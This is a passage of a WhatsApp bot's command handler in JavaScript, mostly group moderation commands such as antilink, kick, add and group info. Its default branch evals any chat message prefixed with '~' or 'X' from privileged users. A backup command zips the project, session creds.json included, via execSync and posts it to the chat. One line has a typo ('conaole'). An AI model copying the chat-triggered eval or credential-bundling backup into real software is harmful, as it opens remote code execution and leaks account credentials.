        return reply(`*ANTILINK SETTINGS*\n\nStatus: ${status ? '✅ ON' : '❌ OFF'}\nMode: ${currentMode}\n\nOptions:\n• ${prefix}antilink on\n• ${prefix}antilink off\n• ${prefix}antilink delete\n• ${prefix}antilink warn\n• ${prefix}antilink kick`);
    }
    
    // Handle on/off
    if (mode === 'on') {
        await db.setGroupSetting(botNumber, m.chat, 'antilink', true);
        return reply('✅ Antilink has been enabled');
    }
    
    if (mode === 'off') {
        await db.setGroupSetting(botNumber, m.chat, 'antilink', false);
        return reply('✅ Antilink has been disabled');
    }
    
    // Handle mode settings
    if (mode === 'delete') {
        await db.setGroupSetting(botNumber, m.chat, 'antilinkmode', 'delete');
        await db.setGroupSetting(botNumber, m.chat, 'antilink', true); // Auto-enable
        return reply('✅ Antilink mode set to: *Delete* (messages will be deleted)');
    }
    
    if (mode === 'warn') {
        await db.setGroupSetting(botNumber, m.chat, 'antilinkmode', 'warn');
        await db.setGroupSetting(botNumber, m.chat, 'antilink', true); // Auto-enable
        return reply('✅ Antilink mode set to: *Warn* (users will be warned)');
    }
    
    if (mode === 'kick') {
        await db.setGroupSetting(botNumber, m.chat, 'antilinkmode', 'kick');
        await db.setGroupSetting(botNumber, m.chat, 'antilink', true); // Auto-enable
        return reply('✅ Antilink mode set to: *Kick* (users will be kicked)');
    }
    
    reply(`❌ Invalid option! Use: on, off, delete, warn, kick`);
    break;
}
case 'allowlink': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin && !Access) return reply(mess.admin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    
    const action = args[0]?.toLowerCase();
    
    // Get target user from:
    // 1. Mentioned user
    // 2. Quoted message sender
    // 3. Argument (phone number)
    let target = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : args[1]);
    
    if (!action) {
        const allowed = await db.getGroupSetting(botNumber, m.chat, 'allowlink', []);
        return reply(`*📋 ALLOWLINK COMMANDS*\n\n• ${prefix}allowlink add @user (or reply to their message)\n• ${prefix}allowlink remove @user (or reply to their message)\n• ${prefix}allowlink list\n• ${prefix}allowlink clear\n\nTotal allowed: ${allowed.length}`);
    }
    
    // ADD USER
    if (action === 'add') {
        if (!target) return reply('❌ Please mention the user, reply to their message, or provide their number!\nExample: .allowlink add @user');
        
        const jid = target.includes('@s.whatsapp.net') ? target : target + '@s.whatsapp.net';
        let allowed = await db.getGroupSetting(botNumber, m.chat, 'allowlink', []);
        
        if (allowed.includes(jid)) {
            return reply(`❌ @${jid.split('@')[0]} is already in allowlist`, { mentions: [jid] });
        }
        
        allowed.push(jid);
        await db.setGroupSetting(botNumber, m.chat, 'allowlink', allowed);
        
        // Get username for better response
        const name = await conn.getName(jid) || jid.split('@')[0];
        return reply(`✅ @${name} can now post links`, { mentions: [jid] });
    }
    
    // REMOVE USER
    if (action === 'remove') {
        if (!target) return reply('❌ Please mention the user, reply to their message, or provide their number!\nExample: .allowlink remove @user');
        
        const jid = target.includes('@s.whatsapp.net') ? target : target + '@s.whatsapp.net';
        let allowed = await db.getGroupSetting(botNumber, m.chat, 'allowlink', []);
        
        const index = allowed.indexOf(jid);
        if (index === -1) {
            return reply(`❌ @${jid.split('@')[0]} is not in allowlist`, { mentions: [jid] });
        }
        
        allowed.splice(index, 1);
        await db.setGroupSetting(botNumber, m.chat, 'allowlink', allowed);
        
        const name = await conn.getName(jid) || jid.split('@')[0];
        return reply(`✅ @${name} removed from allowlist`, { mentions: [jid] });
    }
    
    // LIST ALLOWED USERS
    if (action === 'list') {
        let allowed = await db.getGroupSetting(botNumber, m.chat, 'allowlink', []);
        
        if (allowed.length === 0) {
            return reply('📋 No users are allowed to post links');
        }
        
        let msg = `*📋 ALLOWED USERS (${allowed.length})*\n\n`;
        allowed.forEach((jid, i) => {
            msg += `${i + 1}. @${jid.split('@')[0]}\n`;
        });
        
        return conn.sendMessage(m.chat, { 
            text: msg, 
            mentions: allowed 
        }, { quoted: m });
    }
    
    // CLEAR ALL ALLOWED USERS
    if (action === 'clear') {
        await db.setGroupSetting(botNumber, m.chat, 'allowlink', []);
        return reply('✅ All users removed from allowlist');
    }
    
    reply(`❌ Invalid action! Use: add, remove, list, clear`);
    break;
}
case 'antidemote':
case 'ad': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin && !Access) return reply(mess.admin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
  
    await antidemoteCommand(conn, m, args, botNumber);
    
    break;
}
case 'antipromote':
case 'ap': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin && !Access) return reply(mess.admin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    
    await antipromoteCommand(conn, m, args, botNumber);
    break;
}
case 'antitag': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin && !Access) return reply(mess.admin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    
    const mode = args[0]?.toLowerCase();
    const action = args[1]?.toLowerCase();
    
    // Delete mode
    if (mode === 'delete' && action === 'on') {
        await db.setGroupSetting(botNumber, m.chat, 'antitagmode', 'delete');
        await db.setGroupSetting(botNumber, m.chat, 'antitag', true);
        return reply('✅ Delete mode ON');
    }
    if (mode === 'delete' && action === 'off') {
        await db.setGroupSetting(botNumber, m.chat, 'antitag', false);
        return reply('❌ Delete mode OFF');
    }
    
    // Warn mode
    if (mode === 'warn' && action === 'on') {
        await db.setGroupSetting(botNumber, m.chat, 'antitagmode', 'warn');
        await db.setGroupSetting(botNumber, m.chat, 'antitag', true);
        return reply('✅ Warn mode ON');
    }
    if (mode === 'warn' && action === 'off') {
        await db.setGroupSetting(botNumber, m.chat, 'antitag', false);
        return reply('❌ Warn mode OFF');
    }
    
    // Kick mode
    if (mode === 'kick' && action === 'on') {
        await db.setGroupSetting(botNumber, m.chat, 'antitagmode', 'kick');
        await db.setGroupSetting(botNumber, m.chat, 'antitag', true);
        return reply('✅ Kick mode ON');
    }
    if (mode === 'kick' && action === 'off') {
        await db.setGroupSetting(botNumber, m.chat, 'antitag', false);
        return reply('❌ Kick mode OFF');
    }
    
    // Show help if invalid
    reply('❌ Use: delete on/off, warn on/off, kick on/off');
    break;
}
case 'antitagadmin':
case 'antitagadm': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin && !Access) return reply(mess.admin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    
    const mode = args[0]?.toLowerCase();
    
    if (!mode) {
        const status = await db.getGroupSetting(botNumber, m.chat, 'antitagadmin', false);
        const currentAction = await db.getGroupSetting(botNumber, m.chat, 'antitagadminaction', 'warn');
        return reply(`*👑 ANTITAG ADMIN SETTINGS*\n\nStatus: ${status ? '✅ ON' : '❌ OFF'}\nAction: ${currentAction}\n\nOptions:\n• ${prefix}antitagadmin on\n• ${prefix}antitagadmin off\n• ${prefix}antitagadmin delete\n• ${prefix}antitagadmin warn\n• ${prefix}antitagadmin kick`);
    }
    
    // Handle on/off
    if (mode === 'on') {
        await db.setGroupSetting(botNumber, m.chat, 'antitagadmin', true);
        return reply('✅ Anti-tag admin has been enabled');
    }
    
    if (mode === 'off') {
        await db.setGroupSetting(botNumber, m.chat, 'antitagadmin', false);
        return reply('✅ Anti-tag admin has been disabled');
    }
    
    // Handle action settings
    if (mode === 'delete') {
        await db.setGroupSetting(botNumber, m.chat, 'antitagadminaction', 'delete');
        await db.setGroupSetting(botNumber, m.chat, 'antitagadmin', true); // Auto-enable
        return reply('✅ Anti-tag admin set to: *Delete* (messages will be deleted)');
    }
    
    if (mode === 'warn') {
        await db.setGroupSetting(botNumber, m.chat, 'antitagadminaction', 'warn');
        await db.setGroupSetting(botNumber, m.chat, 'antitagadmin', true); // Auto-enable
        return reply('✅ Anti-tag admin set to: *Warn* (3 warnings then kick)');
    }
    
    if (mode === 'kick') {
        await db.setGroupSetting(botNumber, m.chat, 'antitagadminaction', 'kick');
        await db.setGroupSetting(botNumber, m.chat, 'antitagadmin', true); // Auto-enable
        return reply('✅ Anti-tag admin set to: *Kick* (users will be kicked immediately)');
    }
    
    reply(`❌ Invalid option! Use: on, off, delete, warn, kick`);
    break;
}
case "setgrouppp":
case "setppgroup": {
 if (!m.isGroup) return reply(mess.group);

    if (!quoted) return reply(`*Send or reply to an image with the caption ${prefix + command}*`);
    if (!/image/.test(mime)) return reply(`*Send or reply to an image with the caption ${prefix + command}*`);
    if (/webp/.test(mime)) return reply(`*Send or reply to an image with the caption ${prefix + command}*`);

    const medis = await conn.downloadAndSaveMediaMessage(quoted, "ppbot.jpeg");
    if (args[0] === "full") {
      const { img } = await generateProfilePicture(medis);
      await conn.query({
        tag: "iq",
        attrs: {
          to: m.chat,
          type: "set",
          xmlns: "w:profile:picture",
        },
        content: [
          {
            tag: "picture",
            attrs: {
              type: "image",
            },
            content: img,
          },
        ],
      });
      fs.unlinkSync(medis);
      reply("Group profile picture has been successfully set.");
    } else {
      await conn.updateProfilePicture(m.chat, { url: medis });
      fs.unlinkSync(medis);
      reply("Group profile picture has been successfully updated.");
    }
}
break
case "setgroupname": {
       if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        if (!text) return reply("*Desired groupname?*");

        await conn.groupUpdateSubject(m.chat, text);
        reply(mess.done);
}
break
case "tagadmin": {
    if (!m.isGroup) return reply(mess.group);
    const groupAdmins = participants.filter((p) => p.admin);
    const listAdmin = groupAdmins
      .map((v, i) => `${i + 1}. @${v.id.split("@")[0]}`)
      .join("\n");
    const owner = groupMetadata.owner || groupAdmins.find((p) => p.admin === "superadmin")?.id || m.chat.split`-`[0] + "@s.whatsapp.net";
    let text = `*Group Admins Here:*\n${listAdmin}`.trim();

    conn.sendMessage(
      m.chat,
      { text: text, mentions: [...groupAdmins.map((v) => v.id), owner] },
      { quoted: m }
    );
}
break
case "tagall2": {
try {
        
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);

        let message = "📢 *Attention Everyone!* \n\n";
        const mentions = participants.map(p => p.id);
        
        mentions.forEach(userId => {
            message += `@${userId.split('@')[0]} `;
        });

        await conn.sendMessage(from, {
            text: message,
            mentions,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        }, { quoted: mek });

    } catch (error) {
        console.error("TagAll Error:", error);
        reply("❌ Failed to tag all members");
    }
}
break
case "link":
case "linkgc": {
    if (!Access) return reply(mess.owner);
        if (!m.isGroup) return reply(mess.group);
    
    try {
        // Get fresh group metadata to ensure we have latest data
        const freshGroupMetadata = await conn.groupMetadata(m.chat);
        let groupInvite = await conn.groupInviteCode(m.chat);
        let groupOwner = freshGroupMetadata.owner ? `+${freshGroupMetadata.owner.split('@')[0]}` : "Unknown";
        let groupLink = `https://chat.whatsapp.com/${groupInvite}`;
        let memberCount = freshGroupMetadata.participants.length;

        let message = `🔗 *GROUP LINK*\n\n` +
                      `📌 *Name:* ${freshGroupMetadata.subject}\n` +
                      `👑 *Owner:* ${groupOwner}\n` +
                      `🆔 *Group ID:* ${freshGroupMetadata.id}\n` +
                      `👥 *Members:* ${memberCount}\n\n` +
                      `🌍 *Link:* ${groupLink}\n\n> ${global.wm}`;

        await conn.sendMessage(m.chat, { text: message }, { detectLink: true });
    } catch (error) {
        console.error('Error generating group link:', error);
        reply("❌ *Failed to fetch group link. Make sure the bot has admin permissions.*");
    }
}
break
case "unmute":
case "open": {
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        conn.groupSettingUpdate(m.chat, "not_announcement");
        reply("Group opened by admin. Members can now send messages.");
}
break
case "add": {
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
         if (!text) return reply(`*Please provide phone number with no country code.*\nExample: ${prefix + command} 256755585369`);


        
        let bws = m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await conn.groupParticipantsUpdate(m.chat, [bws], "add");
        reply(mess.done);
}
break
case "kick": {       
        if (!m.isGroup) return reply(mess.group);
       if (!m.isAdmin) return reply(mess.notadmin);
       if (!m.isBotAdmin) return reply(mess.botadmin);
        let bck = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await conn.groupParticipantsUpdate(m.chat, [bck], "remove");
        reply(mess.done);
}
break
case "kick2": {
try {
      
        if (!m.isGroup) return reply(mess.group);
       if (!m.isAdmin) return reply(mess.notadmin);
       if (!m.isBotAdmin) return reply(mess.botadmin);
    
        const userId = mentionedJid?.[0] || m.quoted?.sender;
        if (!userId) return reply("ℹ️ Please mention or quote the user to kick");

        await conn.groupParticipantsUpdate(from, [userId], "remove");
        reply(`✅ User @${userId.split('@')[0]} has been removed`, { 
            mentions: [userId],
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        });

    } catch (error) {
        console.error("Kick Error:", error);
        reply("❌ Failed to remove user from group");
    }
}
break
case "getgrouppp":
case "grouppp":
case "groupicon":
case "groupavatar": {
     if (!m.isGroup) return reply(mess.group);

    try {
      const ppUrl = await conn.profilePictureUrl(m.chat, 'image');

      await conn.sendMessage(m.chat, 
        { 
          image: { url: ppUrl }, 
          caption: `🔥 *This Group's Profile Picture*`
        }, 
        { quoted: m }
      );
    } catch {
      await conn.sendMessage(m.chat, 
        { 
          image: { url: 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60' }, 
          caption: '⚠️ No profile picture found for this group.'
        }, 
        { quoted: m }
      );
    }
}
break
case "groupinfo": {
try {
        if (!isGroup) return reply("❌ This command can only be used in groups");

        const metadata = await conn.groupMetadata(from);
        let ppUrl;
        try {
            ppUrl = await conn.profilePictureUrl(from, "image");
        } catch {
            ppUrl = "https://i.imgur.com/8nLFCVP.png"; // Default group icon
        }

        const infoText = `
*${metadata.subject}*

👥 *Participants:* ${metadata.size}
👑 *Owner:* @${metadata.owner.split('@')[0]}
📝 *Description:* ${metadata.desc || "None"}
🆔 *Group ID:* ${metadata.id}
`.trim();

        await conn.sendMessage(from, {
            image: { url: ppUrl },
            caption: infoText,
            mentions: [metadata.owner],
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        }, { quoted: mek });

    } catch (error) {
        console.error("GInfo Error:", error);
        reply("❌ Failed to get group information");
    }
}
break
case "resetlinkgc": {
if (!m.isGroup) return reply(mess.group)
if (!m.isAdmin) return reply(mess.notadmin);
if (!m.isBotAdmin) return reply(mess.botadmin);

conn.groupRevokeInvite(from)
reply("*group link reseted by admin*" )
}
break
case "userjid":
case "userid": {
if (!m.isGroup) return reply(mess.group);
if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
        const groupMetadata = m.isGroup
            ? await conn.groupMetadata(m.chat).catch((e) => {})
            : "";
        const participants = m.isGroup
            ? await groupMetadata.participants
            : "";
        let textt = `Here is jid address of all users of\n *${groupMetadata.subject}*\n\n`;
        for (let mem of participants) {
            textt += `□ ${mem.id}\n`;
        }
        reply(textt);
}
break
case 'botbackup':
case 'bp': {
if (!Access) return reply(mess.owner)
const sessionPath = "./session";
if (fs.existsSync(sessionPath)) {
const files = fs.readdirSync(sessionPath);
files.forEach((file) => {
if (file !== "creds.json") {
const filePath = path.join(sessionPath, file); 
if (fs.lstatSync(filePath).isDirectory()) {
fs.rmSync(filePath, { recursive: true, force: true });
} else {  
fs.unlinkSync(filePath);
}
}
}
);
}
const ls = execSync("ls").toString().split("\n").filter(
(pe) =>           
pe != "node_modules" &&   
pe != "package-lock.json" &&  
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
execSync(`zip -r backup.zip ${ls.join(" ")}`);
await conn.sendMessage(m.chat, {
document: fs.readFileSync("./backup.zip"),   
fileName: "Jexploit-base-new.zip",
mimetype: "application/zip",
caption: "This is your backup zip.",
}, { quoted: m });
execSync("rm -rf backup.zip");
}
break
        
default:
if (body.startsWith("~")) {
if (!Access) return;
console.log('*execute...*')
function Return(sul) {
let sat = JSON.stringify(sul, null, 2)
let bang = util.format(sat)
if (sat === undefined) {
bang = util.format(sul)
}
return bang;
}
try {
(async () => {
try {
const result = await eval(`(async () => { return ${text} })()`)
console.log(Return(result))
} catch (e) {
console.log(util.format(e))
}
})()
} catch (e) {
console.log(util.format(e))
}
}
if (budy.startsWith("X")) {
if (!Access) return
await reaction(m.chat, '⚡')
try {
let evaled = await eval(q)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
conaole.log(evaled)
} catch (err) {
console.log(util.format(err))
}
}
}
} catch (err) {
console.log(err)
}
}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})